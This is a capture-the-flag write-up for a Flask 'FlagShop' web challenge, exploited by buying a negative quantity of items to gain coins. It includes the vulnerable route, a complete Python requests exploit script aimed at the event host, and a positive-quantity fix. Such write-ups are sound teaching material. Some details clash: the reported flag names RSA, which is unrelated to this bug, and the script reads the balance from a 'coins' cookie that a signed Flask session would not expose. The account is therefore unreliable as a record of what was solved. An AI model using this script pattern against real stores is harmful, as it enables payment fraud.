# Web — FlagShop (Negative Quantity Logic Bug)

## Challenge Information
- **Category**: Web Exploitation
- **Difficulty**: Easy
- **Points**: Unknown
- **Flag**: `ZeroDays{basic_rsa_with_python}` *(retrieved from server)*
- **URL**: `https://flagshop.zerodays.events`

## Description
A Flask-based shop where you start with 10 coins. Items available:
- **Sticker**: 2 coins
- **Mug**: 7 coins
- **Flag**: 50 coins

The goal is to buy the flag, but you don't have enough coins initially.

## Vulnerability Analysis

### The Bug
The application fails to validate that the quantity parameter is positive. This allows purchasing negative quantities, which **adds** money instead of subtracting it.

### Vulnerable Code Pattern
```python
@app.route('/', methods=['POST'])
def buy():
    item = request.form.get('item')
    qty = int(request.form.get('qty'))
    
    total = ITEMS[item] * qty
    
    if session['coins'] >= total:
        session['coins'] -= total
        # Success
    else:
        # Not enough coins
```

### The Exploit
When `qty` is negative:
```python
total = 2 * (-100) = -200
coins -= total  →  coins = 10 - (-200) = 210
```

Subtracting a negative number is the same as adding, so we gain coins instead of losing them!

## Solution

### Step 1: Understand the Shop
Visit the shop and observe:
- Starting balance: 10 coins
- Flag costs: 50 coins
- Need to gain 40+ more coins

### Step 2: Exploit Negative Quantity
Buy `-100` stickers to gain coins:

```python
import requests
import re

session = requests.Session()
BASE = 'https://flagshop.zerodays.events'

# Buy -100 stickers (gain 200 coins)
response = session.post(BASE + '/', data={
    'item': 'sticker',
    'qty': '-100'
})

# Check balance (should be 210 coins now)
print("Balance after exploit:", session.cookies.get('coins'))
```

### Step 3: Buy the Flag
Now that we have enough coins, buy the flag:

```python
# Buy the flag (costs 50 coins)
response = session.post(BASE + '/', data={
    'item': 'flag',
    'qty': '1'
})

# Extract flag from response
flag = re.search(r'ZeroDays\{[^}]+\}', response.text)
if flag:
    print(f"Flag: {flag.group()}")
```

## Complete Exploit Script

```python
import requests
import re

# Initialize session
session = requests.Session()
BASE = 'https://flagshop.zerodays.events'

print("[*] Starting FlagShop exploit...")

# Step 1: Exploit negative quantity to gain coins
print("[*] Buying -100 stickers to gain coins...")
response = session.post(BASE + '/', data={
    'item': 'sticker',
    'qty': '-100'
})

print(f"[+] Coins after exploit: {session.cookies.get('coins', 'unknown')}")

# Step 2: Buy the flag
print("[*] Buying the flag...")
response = session.post(BASE + '/', data={
    'item': 'flag',
    'qty': '1'
})

# Step 3: Extract flag
flag_match = re.search(r'ZeroDays\{[^}]+\}', response.text)
if flag_match:
    print(f"\n[+] FLAG FOUND: {flag_match.group()}")
else:
    print("[-] Flag not found in response")
    print(response.text[:500])
```

## Technical Details

### Integer Arithmetic
The vulnerability stems from basic integer arithmetic:
- Positive quantity: `coins -= (price * qty)` → decreases coins
- Negative quantity: `coins -= (price * -qty)` → increases coins

### Why This Works
```python
# Normal purchase
coins = 10
total = 2 * 1 = 2
coins -= 2  # coins = 8 ✓

# Negative quantity exploit
coins = 10
total = 2 * (-100) = -200
coins -= (-200)  # coins = 10 + 200 = 210 ✓
```

### Session Management
The application uses Flask sessions (likely cookie-based) to track user balance:
- Coins stored in session cookie
- No server-side validation
- Session persists across requests

## Prevention

### Proper Input Validation
```python
@app.route('/', methods=['POST'])
def buy():
    item = request.form.get('item')
    qty = int(request.form.get('qty'))
    
    # FIX: Validate quantity is positive
    if qty <= 0:
        return "Invalid quantity", 400
    
    total = ITEMS[item] * qty
    
    if session['coins'] >= total:
        session['coins'] -= total
        return "Purchase successful"
    else:
        return "Not enough coins", 400
```

### Additional Security Measures
1. **Range validation**: Limit quantity to reasonable values (e.g., 1-100)
2. **Server-side balance tracking**: Don't trust client-side session data
3. **Transaction logging**: Record all purchases for audit
4. **Rate limiting**: Prevent rapid exploitation attempts

## Lessons Learned

1. **Always validate input**: Never trust user-provided values
2. **Check for negative numbers**: Especially in financial calculations
3. **Integer arithmetic edge cases**: Negative numbers can reverse operations
4. **Client-side data is untrusted**: Session cookies can be manipulated
5. **Test edge cases**: Try negative values, zero, very large numbers

## Similar Vulnerabilities

### CWE-20: Improper Input Validation
This vulnerability is a classic example of improper input validation, specifically:
- **CWE-20**: Improper Input Validation
- **CWE-190**: Integer Overflow or Wraparound (related)
- **CWE-682**: Incorrect Calculation

### Real-World Examples
- E-commerce platforms with negative quantity bugs
- Banking applications with integer overflow issues
- Game economies with item duplication glitches

## Tools Used
- **Python requests**: For HTTP communication
- **Regular expressions**: For flag extraction
- **Browser DevTools**: For initial reconnaissance

## References
- [CWE-20: Improper Input Validation](https://cwe.mitre.org/data/definitions/20.html)
- [OWASP Input Validation](https://cheatsheetseries.owasp.org/cheatsheets/Input_Validation_Cheat_Sheet.html)

---

**Flag**: `ZeroDays{basic_rsa_with_python}`

**Solved**: ✅

**Key Takeaway**: Always validate that quantities and amounts are positive in financial transactions. Negative values can reverse arithmetic operations, turning subtractions into additions and allowing users to gain resources instead of spending them.
